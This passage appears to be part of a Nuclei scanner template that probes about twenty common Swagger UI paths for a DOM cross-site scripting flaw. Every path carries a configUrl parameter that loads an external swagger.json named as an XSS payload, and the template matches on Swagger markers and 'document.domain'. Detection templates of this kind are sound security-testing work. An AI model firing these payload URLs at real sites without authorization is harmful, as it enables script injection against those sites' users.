      - "{{BaseURL}}/api/swagger/static/index.html?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/swagger-resources?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/swagger-resources/restservices/v2/api-docs?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/__swagger__/?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/_swagger_/?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/spec/swagger.json?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/spec/swagger.yaml?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/__swagger__/?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/_swagger_/?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/v1/swagger-ui/swagger.json?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/v1/swagger-ui/swagger.yaml?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/swagger-resources/restservices/v2/api-docs?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api/swagger_doc.json?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/docu?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/docs?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/swagger?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/api-doc?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
      - "{{BaseURL}}/beta/docs/?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"

    headers:
      Accept: text/html

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "document.domain"
          - "swagger:"
          - "Swagger 2.0"
          - "\"swagger\":"
          - "Swagger UI"
          - "loadSwaggerUI"
          - "**token**:"
          - "id=\"swagger-ui"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - " @version (v[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})"

